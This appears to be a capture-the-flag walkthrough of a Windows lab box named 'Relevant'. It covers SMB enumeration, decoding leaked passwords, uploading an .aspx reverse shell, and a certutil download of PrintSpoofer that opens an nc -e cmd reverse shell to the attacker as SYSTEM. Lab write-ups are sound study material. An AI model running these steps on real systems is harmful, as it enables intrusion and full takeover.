@@ -1,0 +1,214 @@
+Nmap Result
+
+Stats: 0:15:43 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.20% done; ETC: 19:05 (0:00:00 remaining)
+Nmap scan report for 10.10.179.78
+Host is up (0.29s latency).
+Not shown: 65527 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  Pj�e�U        Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-01-20T12:36:10+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=Relevant
+| Not valid before: 2024-01-19T12:03:13
+|_Not valid after:  2024-07-20T12:03:13
+49663/tcp open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2024-01-20T04:35:33-08:00
+| smb2-time: 
+|   date: 2024-01-20T12:35:31
+|_  start_date: 2024-01-20T12:03:59
+|_clock-skew: mean: 2h00m02s, deviation: 4h00m04s, median: 0s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 977.84 seconds
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+smbmap -H 10.10.179.78 -u anonymous
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.10.179.78:445    Name: 10.10.179.78          Status: Authenticated
+    Disk                                                    Permissions Comment
+    ----                                                    ----------- -------
+    ADMIN$                                              NO ACCESS   Remote Admin
+    C$                                                  NO ACCESS   Default share
+    IPC$                                                READ ONLY   Remote IPC
+    nt4wrksv                                            READ, WRITE
+
+
+smbclient //10.10.179.78/nt4wrksv -U anonymous
+Password for [WORKGROUP\anonymous]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Jan 20 18:35:03 2024
+  ..                                  D        0  Sat Jan 20 18:35:03 2024
+  passwords.txt                       A       98  Sat Jul 25 21:45:33 2020
+
+        7735807 blocks of size 4096. 4922460 blocks available
+smb: \> get password.txt
+NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \password.txt
+smb: \> get passwords.txt
+getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \> exit
+
+cat passwords.txt              
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+
+echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d                                                  
+Bob - !P@$$W0rD!123
+
+echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
+Bill - Juw4nnaM4n420696969!$$$
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Found smbshare in port 49663 port server
+
+http://10.10.133.168:49663/nt4wrksv/passwords.txt
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+smbmap -H 10.10.179.78 -u Bob -p "\!P@\$\$W0rD\!123"           
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.10.179.78:445    Name: 10.10.179.78          Status: Authenticated
+    Disk                                                    Permissions Comment
+    ----                                                    ----------- -------
+    ADMIN$                                              NO ACCESS   Remote Admin
+    C$                                                  NO ACCESS   Default share
+    IPC$                                                READ ONLY   Remote IPC
+    nt4wrksv                                            READ, WRITE
+
+
+We have READ and WRITE Permission in nt4wrksv so we decided to upload .aspx reverse shell.
+
+smbclient //10.10.179.78/nt4wrksv -U Bob                                                       
+Password for [WORKGROUP\Bob]:
+Try "help" to get a list of possible commands.
+smb: \> put shell.exe
+putting file shell.exe as \shell.exe (39.9 kb/s) (average 39.9 kb/s)
+smb: \> put shell2.aspx
+putting file shell2.aspx as \shell2.aspx (7.2 kb/s) (average 30.1 kb/s)
+smb: \> exit
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Initial Access
+
+Listen first with nc
+
+nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [10.17.8.93] from (UNKNOWN) [10.10.179.78] 49882
+Spawn Shell...
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>
+
+Access - http://10.10.133.168:49663/nt4wrksv/shell2.aspx
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Privilege Escalation
+
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+Found SeImpersonatePrivilege is Enabled
+
+So, upload PrintSpoofer.exe into target machine
+
+
+C:\Users\Public>certutil -urlcache -f http://10.17.8.93:8080/PrintSpoofer.exe PrintSpoofer.exe
+certutil -urlcache -f http://10.17.8.93:8080/PrintSpoofer.exe PrintSpoofer.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Public>PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.17.8.93 443 -e cmd"
+PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.17.8.93 443 -e cmd"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+
+
+nc -lvnp 443 
+listening on [any] 443 ...
+connect to [10.17.8.93] from (UNKNOWN) [10.10.133.168] 49808
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+
